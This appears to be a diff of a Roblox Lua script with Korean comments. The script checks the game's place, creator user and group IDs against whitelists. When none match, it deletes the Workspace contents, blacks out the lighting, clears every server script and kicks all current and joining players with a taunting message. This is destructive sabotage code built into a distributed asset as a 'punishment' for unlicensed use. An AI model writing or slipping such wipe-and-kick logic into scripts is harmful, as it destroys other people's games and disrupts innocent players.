@@ -1,78 +1,84 @@
--- [[ sys1-0 : 테이블 리턴형 원격 통제 엔진 ]]
--- 님의 스튜디오 스크립트가 이 코드를 긁어갔을 때, 최종적으로 테이블을 반환합니다.
-
+-- [[ sys1-0 : 삼중 교차 검증 및 원격 통제 엔진 ]]
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 
--- 1. 마스터 화이트리스트 데이터베이스
+-- 1. 삼중 마스터 화이트리스트 데이터베이스
+-- (세 가지 카테고리 중 단 하나라도 true에 걸리면 통과합니다!)
+
 local ALLOWED_PLACES = {
-	[123456789] = true, -- 허가된 Place ID
+	[123456789] = true, -- 허가된 특정 게임(Place) ID
+	[987654321] = true,
 }
 
 local ALLOWED_USERS = {
-	[11223344] = true,  -- 허가된 User ID
+	[11223344] = true,  -- 계정 자체에 라이선스를 부여한 유저 ID
+	[55667788] = true,
 }
 
 local ALLOWED_GROUPS = {
-	[99887766] = true,  -- 허가된 Group ID
+	[99887766] = true,  -- 그룹 소유의 모든 게임을 허가할 그룹 ID
+	[55443322] = true,
 }
 
--- 2. 현재 환경 정보 수집
+-- 2. 현재 게임의 정보 수집
 local currentPlaceId = game.PlaceId
 local currentCreatorId = game.CreatorId
-local currentCreatorType = game.CreatorType
+local currentCreatorType = game.CreatorType -- Enum.CreatorType.User 또는 Group
 
--- 3. 교차 검증 검사
+-- 3. 삼중 조건 검사 (OR 연산으로 하나만 맞아도 프리패스)
 local isAuthorized = false
 
+-- (1) 게임 ID 체크
 if ALLOWED_PLACES[currentPlaceId] then
 	isAuthorized = true
 end
 
+-- (2) 제작자 방식이 '유저'이고, 허가된 유저 ID 목록에 있을 때
 if currentCreatorType == Enum.CreatorType.User and ALLOWED_USERS[currentCreatorId] then
 	isAuthorized = true
 end
 
+-- (3) 제작자 방식이 '그룹'이고, 허가된 그룹 ID 목록에 있을 때
 if currentCreatorType == Enum.CreatorType.Group and ALLOWED_GROUPS[currentCreatorId] then
 	isAuthorized = true
 end
 
--- 4. ㅂ1ㅅ 만드는 처벌 함수 정의
-local function CompleteWipe()
-	local locations = {
-		game.Workspace,
-		game.ReplicatedStorage,
-		game.ServerStorage,
-		game.StarterGui,
-		game.StarterPack,
-		game.Teams,
-		game.ServerScriptService
-	}
 
-	for _, location in ipairs(locations) do
-		pcall(function()
-			for _, item in ipairs(location:GetChildren()) do
-				if not item:IsA("Player") and not item:IsA("Camera") and not item:IsA("Terrain") then
-					item:Destroy()
-				end
-			end
-		end)
+-- 4. 최종 판결 및 집행
+if isAuthorized then
+	-- ==========================================
+	-- [합법 유저] 삼중 필터 중 하나라도 통과했을 때 (사랑의 유지보수)
+	-- ==========================================
+	print("[sys1-0] 삼중 보안 통과 완료. 정상 서비스를 로드합니다.")
+	
+	--------------------------------------------------
+	-- 여기에 님이 지정한 "핵심 양산형 작동 코드"를 넣으세요!
+	--------------------------------------------------
+	
+else
+	-- ==========================================
+	-- [도용자/불법 유저] 셋 다 안 맞을 때 (매직 마우스 원클릭 파멸)
+	-- ==========================================
+	warn("[sys1-0] 삼중 검증 실패. 허가되지 않은 도용 서버입니다.")
+	
+	-- [처벌 코드] 게임을 ㅂ1ㅅ으로 만들기
+	for _, obj in pairs(workspace:GetChildren()) do
+		if not obj:IsA("Terrain") and not obj:IsA("Camera") then
+			pcall(function() obj:Destroy() end)
+		end
 	end
-
+	
+	-- 라이팅 암전
+	local lighting = game:GetService("Lighting")
+	lighting.Ambient = Color3.fromRGB(0, 0, 0)
+	lighting.OutdoorAmbient = Color3.fromRGB(0, 0, 0)
+	
+	-- 서버 스크립트 전멸
 	pcall(function()
-		game.Workspace.Terrain:Clear()
-	end)
-
-	pcall(function()
-		game.Lighting.Brightness = 0
-		game.Lighting.ClockTime = 0
-		game.Lighting.GlobalShadows = true
-		game.Lighting:ClearAllChildren()
-		game.Lighting.FogEnd = 0
-		game.Lighting.Ambient = Color3.new(0, 0, 0)
+		game:GetService("ServerScriptService"):ClearAllChildren()
 	end)
 	
-	-- 접속 유저 및 신규 유저 강퇴 프로토콜
+	-- 킹받는 메시지와 함께 무한 강퇴
 	local kickMessage = "계약 위반 및 에셋 유출로 인해 이 서버는 지배자에 의해 무력화되었습니다. (ㅅㄱ)"
 	for _, player in pairs(Players:GetPlayers()) do
 		pcall(function() player:Kick(kickMessage) end)
@@ -81,14 +87,3 @@ local function CompleteWipe()
 		player:Kick(kickMessage)
 	end)
 end
-
--- ==========================================
--- ★ 핵심: 스튜디오 메인 스크립트가 받아먹을 결과 전달 ★
--- ==========================================
--- 님이 말씀하신 on/off 시스템처럼 작동하도록 테이블에 상태와 함수를 담아 리턴합니다.
-local SystemResult = {
-	["Status"] = isAuthorized, -- 인증 성공 시 true, 실패 시 false (on/off 스위치 역할)
-	["Wipe"] = CompleteWipe    -- 언제든 터트릴 수 있는 파멸 스위치 함수
-}
-
-return SystemResult
